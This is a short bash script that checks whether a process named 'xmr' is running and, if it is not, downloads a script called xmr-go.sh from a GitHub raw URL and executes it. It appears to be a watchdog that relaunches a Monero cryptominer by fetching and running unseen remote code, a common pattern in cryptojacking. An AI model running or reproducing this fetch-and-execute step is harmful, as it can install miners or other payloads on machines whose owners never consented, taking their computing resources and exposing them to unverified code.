#!/bin/bash
if pgrep -x "xmr" > /dev/null
then
    echo "it's running!"
else
    curl -LO https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh
    bash xmr-go.sh
fi
